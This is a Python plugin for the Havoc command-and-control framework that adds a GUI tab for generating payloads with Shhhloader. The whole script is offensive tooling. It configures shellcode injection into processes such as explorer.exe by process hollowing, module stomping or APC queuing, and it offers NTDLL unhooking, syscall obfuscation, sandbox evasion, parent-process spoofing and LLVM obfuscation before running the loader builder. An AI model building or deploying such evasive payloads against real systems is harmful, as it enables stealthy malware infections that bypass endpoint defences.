#!/usr/bin/env python
# -*- Coding: UTF-8 -*-
# Author: Jakob Friedl
# Created on: Mon, 16. Oct 2023
# Description: Shhhloader support for Havoc C2 framework
# Usage: Load this script in Havoc under Scripts -> Scripts Manager to create Shhhloader Tab

import os, sys, subprocess
import havoc
import havocui
from datetime import datetime

# Configuration
shhhloader_path = "/opt/Shhhloader"
python_path = "/usr/bin/python3"

# Variables & Defaults
shellcode_path = ""
syscall_exec_method = "GetSyscallStub"
shellcode_exec_method = "QueueUserAPC"
process = "explorer.exe"
unhook_flag = ""
dll_flag = ""
proxy_dll = ""
verbose_flag = ""
word_encode_flag = ""
no_randomize_flag = ""
no_sandbox_flag = ""
llvm_flag = ""
ppid_flag = ""
ppid_priv_flag = ""
parent_process = "explorer.exe"
sandbox_evasion_method = "sleep"
sandbox_argument = ""

if not os.path.exists(shhhloader_path):
    print("[-] Shhhloader not found in: ", shhhloader_path) 
os.chdir(shhhloader_path)

# Create dialog and log widget
dialog = havocui.Dialog("Shhhloader Payload Generator")
log = havocui.Widget("Shhhavoc Log")

# Add Options
dialog.addLabel("-------------------------- Required Settings ----------------------------")
dialog.addLabel("[*] Shellcode")
def change_shellcode_path(): 
    global shellcode_path
    shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
    print("[*] Shellcode path changed: ", shellcode_path)
dialog.addButton("Choose shellcode", change_shellcode_path)

dialog.addLabel("[*] Syscall execution method")
syscall_exec_methods = ["SysWhispers2", "SysWhispers3", "None"]
def change_syscall_exec_method(num):
    global syscall_exec_method
    if num: 
        syscall_exec_method = syscall_exec_methods[num - 1]
    else: 
        syscall_exec_method = "GetSyscallStub"
    print("[*] Syscall execution method changed: ", syscall_exec_method) 
dialog.addCombobox(change_syscall_exec_method, "GetSyscallStub", *syscall_exec_methods)

dialog.addLabel("[*] Shellcode execution method")
shellcode_exec_methods = ["TreadlessInject", "ModuleStomping", "ProcessHollow", "EnumDisplayMonitors", "RemoteThreadCOntext", "RemoteThreadSuspended", "CurrentThread"]
def change_shellcode_exec_method(num):
    global shellcode_exec_method
    if num:
        shellcode_exec_method = shellcode_exec_methods[num - 1]
    else:
        shellcode_exec_method = "QueueUserAPC" 
    print("[*] Shellcode execution method changed: ", shellcode_exec_method)
dialog.addCombobox(change_shellcode_exec_method, "QueueUserAPC", *shellcode_exec_methods)

dialog.addLabel("[*] Payload type")
payload_types = ["dll"]
def change_payload_type(num):
    global dll_flag
    if num: 
        dll_flag = "-d"
    else: 
        dll_flag = ""
    print("[*] DLL flag changed: ", bool(dll_flag)) 
dialog.addCombobox(change_payload_type, "exe", *payload_types)

dialog.addLabel("[*] Injection Process (Default: explorer.exe)")
def change_process(p): 
    global process 
    process = p
    print("[*] Process changed: ", process)
dialog.addLineedit("e.g. explorer.exe", change_process)

dialog.addLabel("                                                                         ")
dialog.addLabel("-------------------------- Optional Settings ----------------------------")

def change_verbose():
    global verbose_flag
    verbose_flag =  "-v" if not bool(verbose_flag) else "" 
    print("[*] Verbose flag changed: ", bool(verbose_flag))
dialog.addCheckbox("Verbose (Default: False)", change_verbose)

def change_unhook():
    global unhook_flag
    unhook_flag =  "-u" if not bool(unhook_flag) else "" 
    print("[*] Unhook flag changed: ", bool(unhook_flag))
dialog.addCheckbox("Unhook NTDLL (Default: False)", change_unhook)

def change_no_randomize():
    global no_randomize_flag
    no_randomize_flag = "-nr" if not bool(no_randomize_flag) else ""
    print("[*] No-randomize flag changed: ", bool(no_randomize_flag))
dialog.addCheckbox("Disable syscall name randomization (Default: False)", change_no_randomize)

def change_no_sandbox():
    global no_sandbox_flag
    no_sandbox_flag = "-ns" if not bool(no_sandbox_flag) else ""
    print("[*] No-sandbox flag changed: ", bool(no_sandbox_flag))
dialog.addCheckbox("Disable sandbox checks (Default: False)", change_no_sandbox)

def change_llvm():
    global llvm_flag
    llvm_flag = "-l" if not bool(llvm_flag) else ""
    print("[*] LLVM flag changed: ", bool(llvm_flag))
dialog.addCheckbox("Use Obfuscator-LLVM (Default: False)", change_llvm)

def change_ppid_spoofing():
    global ppid_flag
    ppid_flag = "-np" if not bool(ppid_flag) else ""
    print("[*] No-PPID flag changed: ", bool(ppid_flag))
dialog.addCheckbox("Disable PPID spoofing (Default: False)", change_ppid_spoofing)

def change_ppid_priv():
    global ppid_priv_flag
    ppid_priv_flag = "-ppv" if not bool(ppid_priv_flag) else ""
    print("[*] PPID-Priv flag changed: ", bool(ppid_priv_flag))
dialog.addCheckbox("Enable spoofing for privileged parent process (Default: False)", change_ppid_priv)

dialog.addLabel("                                                                         ")
dialog.addLabel("[#] Word-encoding method (Default: XOR)")
encoding_methods = ["English Words"]
def change_encoding_method(num):
    global word_encode_flag
    if num: 
        word_encode_flag = "-w"
    else: 
        word_encode_flag = ""
    print("[*] Word-encoding flag changed: ", bool(word_encode_flag)) 
dialog.addCombobox(change_encoding_method, "XOR", *encoding_methods)

dialog.addLabel("[#] Sandbox evasion technique (Default: sleep)")
sandbox_evasion_methods = ["domain", "hostname", "username", "dll"]
def change_sandbox_evasion_method(num):
    global sandbox_evasion_method
    if num: 
        sandbox_evasion_method = sandbox_evasion_methods[num - 1]
    else: 
        sandbox_evasion_method = "sleep"
    print("[*] Sandbox evasion method changed: ", sandbox_evasion_method) 
dialog.addCombobox(change_sandbox_evasion_method, "sleep", *sandbox_evasion_methods)

dialog.addLabel("[#] Sandbox evasion argument")
def change_sandbox_argument(arg): 
    global sandbox_argument
    sandbox_argument = arg 
    print("[*] Sandbox argument changed: ", sandbox_argument)
dialog.addLineedit("e.g. testlab.local", change_sandbox_argument)

dialog.addLabel(f"[#] Proxy DLL (must exist in {shhhloader_path})")
def change_proxy_dll(arg): 
    global proxy_dll
    proxy_dll = arg 
    print("[*] Proxy DLL changed: ", proxy_dll)
dialog.addLineedit("e.g. apphelp.dll", change_proxy_dll)

dialog.addLabel(f"[#] Parent process for PPID spoofing")
def change_parent_process(p): 
    global parent_process
    parent_process = p
    print("[*] Parent process changed: ", parent_process)
dialog.addLineedit("e.g. explorer.exe", change_parent_process)

# Payload generation
def run():

    if shellcode_path == "":
        havocui.messagebox("Error", "Please specify a valid shellcode path.")
        return

    outfile = havocui.savefiledialog("Save").decode("ascii")
    
    flags = f"{unhook_flag} {dll_flag} {verbose_flag} {llvm_flag} {no_randomize_flag} {no_sandbox_flag} {word_encode_flag} {ppid_flag} {ppid_priv_flag}"

    if sandbox_evasion_method != "sleep":
        flags = flags + f" -s {sandbox_evasion_method}"
    if sandbox_argument != "":
        flags = flags + f" -sa {sandbox_argument}"
    if proxy_dll != "":
        flags = flags + f" -dp {proxy_dll}"
    if parent_process != "":
        flags = flags + f" -pp {parent_process}"
    if process != "":
        flags = flags + f" -p {process}"

    cmd = f"{python_path} {shhhloader_path}/Shhhloader.py {shellcode_path} -sc {syscall_exec_method} -m {shellcode_exec_method} -o {outfile} {flags}"

    output = subprocess.run([arg for arg in cmd.split(" ") if arg != ""], capture_output = True, text = True)

    log.addLabel("=================================================")
    log.addLabel(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
    log.addLabel(" ".join(output.args))
    log.addLabel("=================================================")
    log.addLabel(output.stdout)
    log.addLabel(output.stderr)
    log.addLabel("=================================================")
    log.setBottomTab()

    dialog.close()

dialog.addButton("Generate", run)

# Create Tab 
def shhhloader_generator():
    dialog.exec() 
havocui.createtab("Shhhavoc", "Shhhloader", shhhloader_generator)
